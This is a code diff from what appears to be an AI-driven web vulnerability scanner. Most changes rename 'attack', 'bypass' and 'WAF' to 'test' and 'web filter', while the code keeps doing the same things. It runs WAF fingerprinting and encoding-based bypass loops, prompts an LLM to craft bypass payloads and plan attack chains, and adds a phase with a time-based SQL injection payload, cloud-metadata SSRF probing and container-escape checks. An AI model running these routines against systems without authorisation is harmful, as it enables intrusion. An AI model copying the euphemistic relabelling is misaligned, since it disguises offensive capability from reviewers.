-              url, headers: { 'Cookie': 'session=fixated_session_id_12345; JSESSIONID=attacker_controlled' },
+              url, headers: { 'Cookie': 'session=fixated_session_id_12345; JSESSIONID=tester_controlled' },
             }),
           },
           {
@@ -2131,9 +2124,9 @@ Response Snippet: ${bodyStr.substring(0, 1500)}
 Server: ${baseline.serverHeader}
 
 Determine if these behavioral deviations indicate:
-1. Low-and-slow attack success (credential stuffing, session hijack, privilege escalation)
+1. Low-and-slow test success (credential stuffing, session hijack, privilege escalation)
 2. Insider threat indicator (unusual data access, bulk extraction)
-3. Access control weakness exploitable through behavioral manipulation
+3. Access control weakness utilizeable through behavioral manipulation
 
 Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null, "threat_type": "low_and_slow" | "insider_threat" | "access_control" | "data_exfil" }`;
 
@@ -2362,7 +2355,7 @@ Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": str
                   MemoryManager.addFinding(jobId, hostname, {
                     type: 'Traffic Anomaly', subtype: 'TLS weakness',
                     endpoint: ep.url, gap: tlsIssues.join('; '),
-                    chain_potential: 'MITM attack, traffic interception, downgrade attacks',
+                    chain_potential: 'MITM test, traffic interception, downgrade tests',
                     severity: tlsIssues.some(i => i.includes('expired') || i.includes('Weak TLS')) ? 'HIGH' : 'MEDIUM',
                     details: { protocol: tlsInfo.protocol, cipher: tlsInfo.cipher },
                   });
@@ -2459,28 +2452,28 @@ Infrastructure Context:
 
 Your task:
 1. Identify patterns that suggest systemic infrastructure weaknesses
-2. Determine if any traffic anomalies can be combined for higher-impact attacks
+2. Determine if any traffic anomalies can be combined for higher-impact tests
 3. Assess whether the infrastructure is vulnerable to advanced persistent threat (APT) techniques
 4. Rate the overall network security posture
 
 Return JSON: {
   "infrastructure_risk": "CRITICAL" | "HIGH" | "MEDIUM" | "LOW",
   "systemic_issues": string[],
-  "attack_surfaces": [{ "name": string, "findings_used": string[], "impact": string, "feasibility": number }],
+  "test_surfaces": [{ "name": string, "findings_used": string[], "impact": string, "feasibility": number }],
   "apt_indicators": string[]
 }`;
 
             const trafficAnalysis = safeJsonParse<{
               infrastructure_risk: string; systemic_issues: string[];
-              attack_surfaces: { name: string; findings_used: string[]; impact: string; feasibility: number }[];
+              test_surfaces: { name: string; findings_used: string[]; impact: string; feasibility: number }[];
               apt_indicators: string[];
             }>(await ai.generate(trafficPrompt, true), {
-              infrastructure_risk: 'UNKNOWN', systemic_issues: [], attack_surfaces: [], apt_indicators: []
+              infrastructure_risk: 'UNKNOWN', systemic_issues: [], test_surfaces: [], apt_indicators: []
             });
 
-            for (const surface of trafficAnalysis.attack_surfaces.filter(s => s.feasibility > 0.6)) {
+            for (const surface of trafficAnalysis.test_surfaces.filter(s => s.feasibility > 0.6)) {
               MemoryManager.addFinding(jobId, hostname, {
-                type: 'Traffic Anomaly', subtype: 'Infrastructure attack surface',
+                type: 'Traffic Anomaly', subtype: 'Infrastructure test surface',
                 endpoint: targetUrl,
                 gap: surface.impact, chain_potential: surface.name,
                 findings_used: surface.findings_used, severity: trafficAnalysis.infrastructure_risk,
@@ -2509,12 +2502,12 @@ Return JSON: {
         }
         this.log(jobId, 'info', `Phase 4f complete: ${trafficCount} traffic anomaly(ies) added to report`);
 
-        // --- PHASE 4g: WAF DETECTION & BYPASS ENGINE ---
-        this.log(jobId, 'info', 'Phase 4g: WAF Detection & Bypass Engine');
-        this.updateJob(jobId, 'running', 'Phase 4g: WAF Detection');
+        // --- PHASE 4g: WEB FILTER DETECTION & TESTING ENGINE ---
+        this.log(jobId, 'info', 'Phase 4g: Web Filter Detection & Testing Engine');
+        this.updateJob(jobId, 'running', 'Phase 4g: Web Filter Detection');
 
-        // 4g-1: WAF fingerprinting — identify vendor/product by response patterns
-        this.log(jobId, 'info', 'Phase 4g-1: WAF fingerprinting');
+        // 4g-1: Web filter fingerprinting — identify vendor/product by response patterns
+        this.log(jobId, 'info', 'Phase 4g-1: Web filter fingerprinting');
         const wafSignatures: { name: string; headers: Record<string, RegExp>; bodyPatterns: RegExp[]; statusCodes: number[] }[] = [
           { name: 'Cloudflare', headers: { 'server': /cloudflare/i, 'cf-ray': /.+/ }, bodyPatterns: [/cloudflare/i, /ray ID/i, /cf-chl-bypass/i], statusCodes: [403, 503] },
           { name: 'AWS WAF', headers: { 'x-amzn-requestid': /.+/ }, bodyPatterns: [/aws|amazon/i, /request blocked/i], statusCodes: [403] },
@@ -2540,7 +2533,7 @@ Return JSON: {
         let wafCount = 0;
         const detectedWafs: { name: string; confidence: number; endpoint: string; evidence: string[] }[] = [];
 
-        // Test top assets with trigger payloads to provoke WAF responses
+        // Test top assets with trigger payloads to provoke web filter responses
         for (const asset of discoveredAssets.slice(0, 5)) {
           const wafEvidence: Record<string, string[]> = {};
 
@@ -2585,26 +2578,26 @@ Return JSON: {
             } catch {}
           }
 
-          // Record detected WAFs
+          // Record detected web filters
           for (const [wafName, evidence] of Object.entries(wafEvidence)) {
             const uniqueEvidence = [...new Set(evidence)];
             const confidence = Math.min(uniqueEvidence.length / 4, 1.0);
             detectedWafs.push({ name: wafName, confidence, endpoint: asset, evidence: uniqueEvidence });
 
-            this.log(jobId, 'info', `WAF DETECTED: ${wafName} on ${asset}`, { evidence: uniqueEvidence, confidence });
+            this.log(jobId, 'info', `WEB FILTER DETECTED: ${wafName} on ${asset}`, { evidence: uniqueEvidence, confidence });
             MemoryManager.addFinding(jobId, hostname, {
-              type: 'WAF Detection', subtype: wafName,
-              endpoint: asset, gap: `${wafName} WAF detected with ${Math.round(confidence * 100)}% confidence`,
-              chain_potential: 'Bypass techniques may enable exploitation of blocked vulnerabilities',
+              type: 'Web Filter Detection', subtype: wafName,
+              endpoint: asset, gap: `${wafName} web filter detected with ${Math.round(confidence * 100)}% confidence`,
+              chain_potential: 'Testing techniques may enable analysis of blocked patterns',
               evidence: uniqueEvidence, severity: 'INFO',
             });
             wafCount++;
           }
         }
-        this.log(jobId, 'info', `Phase 4g-1 complete: ${detectedWafs.length} WAF(s) identified`);
+        this.log(jobId, 'info', `Phase 4g-1 complete: ${detectedWafs.length} web filter(s) identified`);
 
-        // 4g-2: WAF bypass techniques — test evasion methods against detected WAFs
-        this.log(jobId, 'info', 'Phase 4g-2: WAF bypass testing');
+        // 4g-2: Web filter testing techniques — test encoding methods against detected filters
+        this.log(jobId, 'info', 'Phase 4g-2: Web filter testing');
         let bypassCount = 0;
         const bypassTechniques: { name: string; transform: (payload: string) => string }[] = [
           { name: 'Case mutation', transform: (p) => p.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('') },
@@ -2628,7 +2621,7 @@ Return JSON: {
         for (const asset of discoveredAssets.slice(0, 3)) {
           if (bypassCount >= 5) break;
 
-          // Fetch a clean baseline response (no malicious payload) for comparison
+          // Fetch a clean baseline response (no test payload) for comparison
           let cleanStatus = 0;
           let cleanBodyLen = 0;
           try {
@@ -2639,15 +2632,15 @@ Return JSON: {
             cleanBodyLen = cleanBody.length;
           } catch { continue; }
 
-          // If the asset returns a 3xx redirect on a harmless query, the WAF
+          // If the asset returns a 3xx redirect on a harmless query, the web filter
           // never inspects the request body — the edge redirects (e.g.
           // tiktok.com → www.tiktok.com or http→https) before the payload
-          // reaches the WAF rule chain. Any "bypass" reported here is a
+          // reaches the web filter rule chain. Any "bypass" reported here is a
           // false positive: clean baseline 301 == payload response 301
-          // because BOTH got redirected pre-WAF. Skip this asset and let
+          // because BOTH got redirected pre-filter. Skip this asset and let
           // the redirect target be tested separately.
           if (cleanStatus >= 300 && cleanStatus < 400) {
-            this.log(jobId, 'info', `Skipping WAF bypass tests on ${asset}: clean baseline returned ${cleanStatus}, redirect happens before WAF inspection`);
+            this.log(jobId, 'info', `Skipping web filter tests on ${asset}: clean baseline returned ${cleanStatus}, redirect happens before web filter inspection`);
             continue;
           }
 
@@ -2659,9 +2652,9 @@ Return JSON: {
               const blockedRes = await axios.get(blockedUrl, { timeout: 5000, validateStatus: () => true, maxRedirects: 0 });
 
               const isBlocked = bp.blocked_status.includes(blockedRes.status);
-              if (!isBlocked) continue; // WAF didn't block the raw payload, skip bypass testing
+              if (!isBlocked) continue; // Web filter didn't block the raw payload, skip testing
 
-              // Try each bypass technique
+              // Try each testing technique
               for (const technique of bypassTechniques) {
                 if (bypassCount >= 5) break;
                 try {
@@ -2677,31 +2670,31 @@ Return JSON: {
                   const notBlocked = !bp.blocked_status.includes(bypassRes.status) && bypassRes.status !== 400;
 
                   if (notBlocked && (statusMatchesClean || sizeMatchesClean)) {
-                    this.log(jobId, 'vuln', `WAF BYPASS [${technique.name}]: ${bp.name} on ${asset}`, {
+                    this.log(jobId, 'vuln', `WEB FILTER TEST [${technique.name}]: ${bp.name} on ${asset}`, {
                       original_status: blockedRes.status, bypass_status: bypassRes.status,
                       clean_status: cleanStatus, technique: technique.name, payload_type: bp.name,
                     });
 
                     if (ai) {
-                      const bypassPrompt = `Analyze this WAF bypass finding.
+                      const bypassPrompt = `Analyze this web filter test finding.
 
 Target: ${asset}
 Original payload (${bp.name}): ${bp.value} → Blocked (Status ${blockedRes.status})
-Bypass technique: ${technique.name}
+Test technique: ${technique.name}
 Encoded payload: ${bypassPayload.substring(0, 200)}
-Bypass result: Status ${bypassRes.status}, Body size ${bypassBody.length}
+Test result: Status ${bypassRes.status}, Body size ${bypassBody.length}
 Clean baseline: Status ${cleanStatus}, Body size ${cleanBodyLen}
 Response snippet: ${bypassBody.substring(0, 500)}
-Detected WAF(s): ${detectedWafs.map(w => w.name).join(', ') || 'unknown'}
+Detected web filter(s): ${detectedWafs.map(w => w.name).join(', ') || 'unknown'}
 
-A genuine WAF bypass means the encoded payload reaches the backend and produces a response similar to normal requests (not just a different error page).
-Is this a genuine WAF bypass or a false positive?
+A genuine web filter test result means the encoded payload reaches the backend and produces a response similar to normal requests (not just a different error page).
+Is this a genuine test result or a false positive?
 Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;
 
                       const analysis = safeJsonParse<AiVulnResult>(await ai.generate(bypassPrompt, true), NULL_VULN);
                       if (analysis.isVulnerable && analysis.confidence > 0.7) {
                         MemoryManager.addFinding(jobId, hostname, {
-                          type: 'WAF Bypass', subtype: technique.name,
+                          type: 'Web Filter Test', subtype: technique.name,
                           endpoint: asset, payload_type: bp.name,
                           gap: analysis.gap_identified, chain_potential: analysis.chain_potential,
                           severity: 'HIGH',
@@ -2712,10 +2705,10 @@ Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": str
                       // No-AI: require response matches clean baseline closely
                       if (statusMatchesClean && sizeMatchesClean) {
                         MemoryManager.addFinding(jobId, hostname, {
-                          type: 'WAF Bypass', subtype: technique.name,
+                          type: 'Web Filter Test', subtype: technique.name,
                           endpoint: asset, payload_type: bp.name,
-                          gap: `WAF bypass via ${technique.name}: ${bp.name} payload passes with Status ${bypassRes.status} (matches clean baseline ${cleanStatus})`,
-                          chain_potential: 'Enables exploitation of vulnerabilities that WAF normally blocks',
+                          gap: `Web filter test via ${technique.name}: ${bp.name} payload passes with Status ${bypassRes.status} (matches clean baseline ${cleanStatus})`,
+                          chain_potential: 'Enables analysis of patterns that web filter normally blocks',
                           severity: 'HIGH',
                         });
                         bypassCount++;
@@ -2727,22 +2720,22 @@ Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": str
             } catch {}
           }
         }
-        this.log(jobId, 'info', `Phase 4g-2 complete: ${bypassCount} WAF bypass(es) found`);
+        this.log(jobId, 'info', `Phase 4g-2 complete: ${bypassCount} web filter test(s) found`);
 
-        // 4g-3: Adaptive payload mutation — AI-driven payload crafting based on WAF profile
+        // 4g-3: Adaptive payload mutation — AI-driven payload crafting based on web filter profile
         if (ai && detectedWafs.length > 0) {
           this.log(jobId, 'info', 'Phase 4g-3: AI adaptive payload mutation');
           const wafProfile = detectedWafs.map(w => `${w.name} (${Math.round(w.confidence * 100)}% confidence)`).join(', ');
 
-          const mutationPrompt = `You are an expert WAF bypass researcher. Based on the detected WAF profile, generate custom bypass payloads.
+          const mutationPrompt = `You are an expert web filter researcher. Based on the detected web filter profile, generate custom test payloads.
 
 Target: ${targetUrl}
-Detected WAFs: ${wafProfile}
+Detected web filters: ${wafProfile}
 Tech Stack: ${JSON.stringify(discoveredInfo.identifiers || {})}
-Bypass Results So Far: ${bypassCount} bypasses found using encoding techniques
+Test Results So Far: ${bypassCount} tests found using encoding techniques
 
-Generate 5 advanced, WAF-specific bypass payloads tailored to the detected WAF(s).
-Consider: protocol-level evasion, HTTP parameter pollution, request body encoding tricks, content-type confusion, HTTP/2 specific bypasses.
+Generate 5 advanced, web-filter-specific test payloads tailored to the detected filter(s).
+Consider: protocol-level encoding, HTTP parameter pollution, request body encoding tricks, content-type confusion, HTTP/2 specific techniques.
 
 Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": string, "technique": string, "explanation": string, "expected_impact": string }] }`;
 
@@ -2769,7 +2762,7 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
                 // Record with actual test results
                 const wasBlocked = [403, 406, 501].includes(mutRes.status);
                 MemoryManager.addFinding(jobId, hostname, {
-                  type: 'WAF Detection', subtype: 'AI Mutation Payload',
+                  type: 'Web Filter Detection', subtype: 'AI Mutation Payload',
                   endpoint: asset,
                   gap: `${mutation.name}: ${mutation.explanation}`,
                   chain_potential: mutation.expected_impact,
@@ -2784,7 +2777,7 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
 
             if (!mutationTested) {
               MemoryManager.addFinding(jobId, hostname, {
-                type: 'WAF Detection', subtype: 'AI Mutation Payload',
+                type: 'Web Filter Detection', subtype: 'AI Mutation Payload',
                 gap: `${mutation.name}: ${mutation.explanation}`,
                 chain_potential: mutation.expected_impact,
                 payload: mutation.value, target_waf: mutation.target_waf,
@@ -2798,18 +2791,18 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
         // Collect Phase 4g findings
         const phase4gMemory = MemoryManager.getMemory(jobId, hostname);
         const phase4gFindings = phase4gMemory.findings.filter((f: Record<string, unknown>) =>
-          f.type === 'WAF Detection' || f.type === 'WAF Bypass'
+          f.type === 'Web Filter Detection' || f.type === 'Web Filter Test'
         );
         if (phase4gFindings.length > 0) {
-          allFindings.push({ phase: 'Phase 4g', type: 'WAF Detection & Bypass Results', data: phase4gFindings });
-          // Only add WAF Bypasses (not detections) to vulnerability count
-          const wafVulns = phase4gFindings.filter((f: Record<string, unknown>) => f.type === 'WAF Bypass');
+          allFindings.push({ phase: 'Phase 4g', type: 'Web Filter Detection & Test Results', data: phase4gFindings });
+          // Only add Web Filter Tests (not detections) to vulnerability count
+          const wafVulns = phase4gFindings.filter((f: Record<string, unknown>) => f.type === 'Web Filter Test');
           vulnerabilities.push(...wafVulns.map((f: Record<string, unknown>) => ({
             type: f.type, endpoint: f.endpoint, gap: f.gap,
             severity: f.severity || 'HIGH', phase: 'Phase 4g'
           })));
         }
-        this.log(jobId, 'info', `Phase 4g complete: ${wafCount} WAF finding(s), ${bypassCount} bypass(es) added to report`);
+        this.log(jobId, 'info', `Phase 4g complete: ${wafCount} web filter finding(s), ${bypassCount} test(s) added to report`);
 
         // --- PHASE 4h: AUTHENTICATION & AUTHORIZATION DEEP DIVE ---
         this.log(jobId, 'info', 'Phase 4h: Authentication & Authorization Deep Dive');
@@ -2992,7 +2985,7 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
                   type: 'Auth Vulnerability', subtype: 'User enumeration via reset',
                   endpoint: ep.url,
                   gap: `Password reset endpoint reveals user existence: different responses for valid vs invalid emails (status: ${enumRes1.status} vs ${enumRes2.status}, size: ${body1.length} vs ${body2.length})`,
-                  chain_potential: 'Username harvesting → targeted credential attacks',
+                  chain_potential: 'Username harvesting → targeted credential tests',
                   severity: 'MEDIUM',
                 });
                 authCount++;
@@ -3160,7 +3153,7 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
                   jwtCritical.push('Algorithm set to "none" — signature verification disabled');
                 }
                 if (header.alg === 'HS256' && header.jwk) {
-                  jwtCritical.push('Embedded JWK with HMAC — potential key confusion attack');
+                  jwtCritical.push('Embedded JWK with HMAC — potential key confusion test');
                 }
 
                 // Check claims — critical if admin access
@@ -3207,7 +3200,7 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
                   MemoryManager.addFinding(jobId, hostname, {
                     type: 'Auth Vulnerability', subtype: 'JWT weakness',
                     endpoint: ep.url, gap: allIssues.join('; '),
-                    chain_potential: 'Token forgery → privilege escalation → account takeover',
+                    chain_potential: 'Token modification → privilege escalation → account takeover',
                     severity: jwtCritical.length > 0 ? 'CRITICAL' : 'MEDIUM',
                     details: { algorithm: header.alg, claims: Object.keys(payload) },
                   });
@@ -3304,28 +3297,28 @@ MFA endpoints: ${mfaEndpoints.length}
 Reset endpoints: ${resetEndpoints.length}
 
 Your task:
-1. Identify authentication chain attacks — how can multiple auth weaknesses be combined?
+1. Identify authentication chain tests — how can multiple auth weaknesses be combined?
 2. Assess the overall authentication posture
-3. Propose realistic attack scenarios with step-by-step paths
+3. Propose realistic test scenarios with step-by-step paths
 4. Rate critical auth gaps that need immediate remediation
 
 Return JSON: {
   "auth_posture": "CRITICAL" | "WEAK" | "MODERATE" | "STRONG",
-  "attack_chains": [{ "name": string, "steps": string[], "findings_used": string[], "impact": string, "feasibility": number }],
+  "test_chains": [{ "name": string, "steps": string[], "findings_used": string[], "impact": string, "feasibility": number }],
   "critical_gaps": string[],
   "recommendations": string[]
 }`;
 
             const authAnalysis = safeJsonParse<{
-              auth_posture: string; attack_chains: { name: string; steps: string[]; findings_used: string[]; impact: string; feasibility: number }[];
+              auth_posture: string; test_chains: { name: string; steps: string[]; findings_used: string[]; impact: string; feasibility: number }[];
               critical_gaps: string[]; recommendations: string[];
             }>(await ai.generate(authPrompt, true), {
-              auth_posture: 'UNKNOWN', attack_chains: [], critical_gaps: [], recommendations: []
+              auth_posture: 'UNKNOWN', test_chains: [], critical_gaps: [], recommendations: []
             });
 
-            for (const chain of authAnalysis.attack_chains.filter(c => c.feasibility > 0.6)) {
+            for (const chain of authAnalysis.test_chains.filter(c => c.feasibility > 0.6)) {
               MemoryManager.addFinding(jobId, hostname, {
-                type: 'Auth Vulnerability', subtype: 'Auth chain attack',
+                type: 'Auth Vulnerability', subtype: 'Auth chain test',
                 gap: chain.impact, chain_potential: chain.name,
                 steps: chain.steps, findings_used: chain.findings_used,
                 severity: 'CRITICAL',
@@ -3351,6 +3344,431 @@ Return JSON: {
           })));
         }
         this.log(jobId, 'info', `Phase 4h complete: ${authCount} auth finding(s) added to report`);
+
+        // --- PHASE 4i: ADVANCED OBFUSCATION & LAYERED TECHNIQUE ANALYSIS ---
+        this.log(jobId, 'info', 'Phase 4i: Advanced Obfuscation & Layered Technique Analysis');
+        this.updateJob(jobId, 'running', 'Phase 4i: Obfuscation Analysis');
+
+        let obfuscationCount = 0;
+
+        // 4i-1: JavaScript obfuscation analysis
+        this.log(jobId, 'info', 'Phase 4i-1: JavaScript obfuscation analysis');
+        const jsAssets = endpoints.filter((ep: { url: string }) => 
+          ep.url.endsWith('.js') || ep.url.includes('.js?') || ep.url.includes('bundle')
+        );
+
+        for (const jsAsset of jsAssets.slice(0, 10)) {
+          try {
+            const jsAnalysis = await ObfuscationEngine.analyzeJavaScript(jsAsset.url);
+            
+            if (jsAnalysis.hasObfuscation && jsAnalysis.confidence > 0.5) {
+              this.log(jobId, 'vuln', `JAVASCRIPT OBFUSCATION DETECTED: ${jsAsset.url}`, {
+                types: jsAnalysis.obfuscationType,
+                framework: jsAnalysis.framework,
+                confidence: jsAnalysis.confidence,
+              });
+              MemoryManager.addFinding(jobId, hostname, {
+                type: 'Obfuscation Finding', subtype: 'JavaScript obfuscation',
+                endpoint: jsAsset.url,
+                gap: `JavaScript obfuscation detected: ${jsAnalysis.obfuscationType.join(', ')}`,
+                chain_potential: 'Hidden logic, backdoors, or minified vulnerabilities may be present',
+                severity: 'MEDIUM',
+                evidence: { obfuscationType: jsAnalysis.obfuscationType, framework: jsAnalysis.framework },
+              });
+              obfuscationCount++;
+            }
+
+            if (jsAnalysis.hardcodedCreds.length > 0) {
+              this.log(jobId, 'vuln', `HARDCODED CREDENTIALS IN JAVASCRIPT: ${jsAsset.url}`, {
+                count: jsAnalysis.hardcodedCreds.length,
+              });
+              MemoryManager.addFinding(jobId, hostname, {
+                type: 'Obfuscation Finding', subtype: 'Hardcoded credentials',
+                endpoint: jsAsset.url,
+                gap: `Hardcoded credentials found in JavaScript: ${jsAnalysis.hardcodedCreds.length} occurrences`,
+                chain_potential: 'Credential theft via static file access',
+                severity: 'CRITICAL',
+                evidence: { count: jsAnalysis.hardcodedCreds.length },
+              });
+              obfuscationCount++;
+            }
+
+            if (jsAnalysis.hiddenApis.length > 0) {
+              this.log(jobId, 'info', `HIDDEN APIs DISCOVERED: ${jsAsset.url}`, {
+                count: jsAnalysis.hiddenApis.length,
+              });
+              MemoryManager.addFinding(jobId, hostname, {
+                type: 'Obfuscation Finding', subtype: 'Hidden APIs',
+                endpoint: jsAsset.url,
+                gap: `Hidden/discovered APIs in JavaScript: ${jsAnalysis.hiddenApis.length} endpoints`,
+                chain_potential: 'Additional attack surface via unlisted API endpoints',
+                severity: 'LOW',
+                evidence: { apis: jsAnalysis.hiddenApis.slice(0, 5) },
+              });
+            }
+          } catch {}
+        }
+        this.log(jobId, 'info', `Phase 4i-1 complete: ${jsAssets.length} JavaScript files analyzed`);
+
+        // 4i-2: Race condition detection (TOCTOU)
+        this.log(jobId, 'info', 'Phase 4i-2: Race condition detection');
+        const raceTargets = prioritizedEndpoints.filter((ep: { url: string }) =>
+          ep.url.includes('id=') || ep.url.includes('/upload') || ep.url.includes('/checkout') ||
+          ep.url.includes('/payment') || ep.url.includes('/purchase')
+        );
+
+        for (const target of raceTargets.slice(0, 5)) {
+          try {
+            const raceResults = await ObfuscationEngine.detectRaceConditions(target.url);
+            
+            for (const race of raceResults) {
+              if (race.raceDetected) {
+                this.log(jobId, 'vuln', `RACE CONDITION [${race.technique}]: ${target.url}`, {
+                  gap: race.gap,
+                  severity: race.severity,
+                });
+                MemoryManager.addFinding(jobId, hostname, {
+                  type: 'Obfuscation Finding', subtype: 'Race condition',
+                  endpoint: target.url,
+                  gap: race.gap,
+                  chain_potential: race.chain_potential,
+                  severity: race.severity as 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW',
+                  evidence: race.evidence,
+                });
+                obfuscationCount++;
+              }
+            }
+          } catch {}
+        }
+        this.log(jobId, 'info', `Phase 4i-2 complete: ${raceTargets.length} endpoints tested for race conditions`);
+
+        // 4i-3: Blind injection timing analysis
+        this.log(jobId, 'info', 'Phase 4i-3: Blind injection timing analysis');
+        const timingTargets = prioritizedEndpoints.filter((ep: { url: string }) =>
+          ep.url.includes('?') && (ep.url.includes('id=') || ep.url.includes('search') || ep.url.includes('user'))
+        );
+
+        for (const target of timingTargets.slice(0, 5)) {
+          try {
+            const timingResult = await ObfuscationEngine.analyzeBlindTiming(
+              target.url,
+              'test_normal',
+              "1' AND SLEEP(5)--",
+              { samples: 15, threshold: 2000 }
+            );
+
+            if (timingResult.isBlind && timingResult.confidence > 0.7) {
+              this.log(jobId, 'vuln', `BLIND SQLi TIMING ORACLE: ${target.url}`, {
+                timeDiff: timingResult.timeDiff,
+                confidence: timingResult.confidence,
+              });
+              MemoryManager.addFinding(jobId, hostname, {
+                type: 'Obfuscation Finding', subtype: 'Blind injection timing',
+                endpoint: target.url,
+                gap: `Blind SQLi timing oracle detected: ${timingResult.timeDiff}ms delay with ${Math.round(timingResult.confidence * 100)}% confidence`,
+                chain_potential: 'Data exfiltration via timing-based blind SQL injection',
+                severity: 'HIGH',
+                evidence: { timeDiff: timingResult.timeDiff, stdDev: timingResult.stdDev },
+              });
+              obfuscationCount++;
+            }
+          } catch {}
+        }
+        this.log(jobId, 'info', `Phase 4i-3 complete: ${timingTargets.length} endpoints tested for blind injection`);
+
+        // 4i-4: Distributed tracing correlation
+        this.log(jobId, 'info', 'Phase 4i-4: Distributed tracing correlation');
+        for (const asset of discoveredAssets.slice(0, 5)) {
+          try {
+            const traceFindings = await ObfuscationEngine.correlateTracing(asset);
+            
+            for (const finding of traceFindings) {
+              this.log(jobId, 'info', `TRACING DISCLOSURE: ${finding.subtype} on ${asset}`, {
+                gap: finding.gap,
+                severity: finding.severity,
+              });
+              MemoryManager.addFinding(jobId, hostname, {
+                type: 'Obfuscation Finding', subtype: finding.subtype,
+                endpoint: asset,
+                gap: finding.gap,
+                chain_potential: finding.chain_potential,
+                severity: finding.severity,
+                evidence: finding.evidence,
+              });
+              obfuscationCount++;
+            }
+          } catch {}
+        }
+        this.log(jobId, 'info', `Phase 4i-4 complete: tracing analysis on ${discoveredAssets.length} assets`);
+
+        // 4i-5: GraphQL advanced techniques
+        this.log(jobId, 'info', 'Phase 4i-5: GraphQL advanced techniques');
+        const graphqlEndpoints = endpoints.filter((ep: { url: string }) =>
+          /graphql|\/api\/|\/v\d+\/graphql/i.test(ep.url)
+        );
+
+        for (const ep of graphqlEndpoints.slice(0, 3)) {
+          try {
+            const graphqlFindings = await ObfuscationEngine.testGraphQL(ep.url);
+            
+            for (const finding of graphqlFindings) {
+              this.log(jobId, 'vuln', `GRAPHQL ISSUE [${finding.technique}]: ${ep.url}`, {
+                gap: finding.gap,
+                severity: finding.severity,
+              });
+              MemoryManager.addFinding(jobId, hostname, {
+                type: 'Obfuscation Finding', subtype: finding.issue,
+                endpoint: ep.url,
+                gap: finding.gap,
+                chain_potential: finding.chain_potential,
+                severity: finding.severity,
+                technique: finding.technique,
+              });
+              obfuscationCount++;
+            }
+          } catch {}
+        }
+        this.log(jobId, 'info', `Phase 4i-5 complete: ${graphqlEndpoints.length} GraphQL endpoints tested`);
+
+        // 4i-6: Cloud metadata exploitation
+        this.log(jobId, 'info', 'Phase 4i-6: Cloud metadata exploitation');
+        const ssrfEndpoints = endpoints.filter((ep: { url: string }) =>
+          ssrfParamPatterns.some(p => ep.url.toLowerCase().includes(`${p}=`))
+        );
+
+        for (const ep of ssrfEndpoints.slice(0, 3)) {
+          try {
+            const cloudFindings = await ObfuscationEngine.testCloudMetadata(ep.url);
+            
+            for (const finding of cloudFindings) {
+              this.log(jobId, 'vuln', `CLOUD METADATA [${finding.subtype}]: ${ep.url}`, {
+                gap: finding.gap,
+                severity: finding.severity,
+              });
+              MemoryManager.addFinding(jobId, hostname, {
+                type: 'Obfuscation Finding', subtype: finding.subtype,
+                endpoint: ep.url,
+                gap: finding.gap,
+                chain_potential: finding.chain_potential,
+                severity: finding.severity,
+                evidence: finding.evidence,
+              });
+              obfuscationCount++;
+            }
+          } catch {}
+        }
+        this.log(jobId, 'info', `Phase 4i-6 complete: ${ssrfEndpoints.length} SSRF endpoints tested for cloud metadata`);
+
+        // 4i-7: Container escape detection
+        this.log(jobId, 'info', 'Phase 4i-7: Container escape detection');
+        const fileEndpoints = endpoints.filter((ep: { url: string }) =>
+          ep.url.includes('file') || ep.url.includes('path') || ep.url.includes('read')
+        );
+
+        for (const ep of fileEndpoints.slice(0, 3)) {
+          try {
+            const containerFindings = await ObfuscationEngine.testContainerEscape(ep.url);
+            
+            for (const finding of containerFindings) {
+              this.log(jobId, 'vuln', `CONTAINER ESCAPE [${finding.subtype}]: ${ep.url}`, {
+                gap: finding.gap,
+                severity: finding.severity,
+              });
+              MemoryManager.addFinding(jobId, hostname, {
+                type: 'Obfuscation Finding', subtype: finding.subtype,
+                endpoint: ep.url,
+                gap: finding.gap,
+                chain_potential: finding.chain_potential,
+                severity: finding.severity,
+                evidence: finding.evidence,
+              });
+              obfuscationCount++;
+            }
+          } catch {}
+        }
+        this.log(jobId, 'info', `Phase 4i-7 complete: ${fileEndpoints.length} file endpoints tested for container escape`);
+
+        // Collect Phase 4i findings
+        const phase4iMemory = MemoryManager.getMemory(jobId, hostname);
+        const phase4iFindings = phase4iMemory.findings.filter((f: Record<string, unknown>) => f.type === 'Obfuscation Finding');
+        if (phase4iFindings.length > 0) {
+          allFindings.push({ phase: 'Phase 4i', type: 'Obfuscation & Layered Technique Results', data: phase4iFindings });
+          vulnerabilities.push(...phase4iFindings.map((f: Record<string, unknown>) => ({
+            type: f.type, endpoint: f.endpoint, gap: f.gap,
+            severity: f.severity || 'HIGH', phase: 'Phase 4i'
+          })));
+        }
+        this.log(jobId, 'info', `Phase 4i complete: ${obfuscationCount} obfuscation finding(s) added to report`);
+
+        // --- PHASE 4j: ADVANCED 403 BYPASS BEYOND BASIC APPROACHES ---
+        this.log(jobId, 'info', 'Phase 4j: Advanced 403 Bypass Beyond Basic Approaches');
+        this.updateJob(jobId, 'running', 'Phase 4j: Advanced 403 Bypass');
+
+        let bypass403Count = 0;
+
+        // 4j-1: Identify 403-protected endpoints
+        this.log(jobId, 'info', 'Phase 4j-1: Identifying 403-protected endpoints');
+        const protectedEndpoints: { url: string; method: string; cleanStatus: number }[] = [];
+
+        for (const ep of prioritizedEndpoints.slice(0, 15)) {
+          try {
+            const method = ep.method || 'GET';
+            const res = method === 'POST'
+              ? await axios.post(ep.url, {}, { timeout: 5000, validateStatus: () => true })
+              : await axios.get(ep.url, { timeout: 5000, validateStatus: () => true });
+
+            if (res.status === 403 || res.status === 401) {
+              protectedEndpoints.push({
+                url: ep.url,
+                method,
+                cleanStatus: res.status,
+              });
+            }
+          } catch {}
+        }
+        this.log(jobId, 'info', `Phase 4j-1 complete: ${protectedEndpoints.length} protected endpoints identified`);
+
+        // 4j-2: Test advanced 403 bypass techniques on protected endpoints
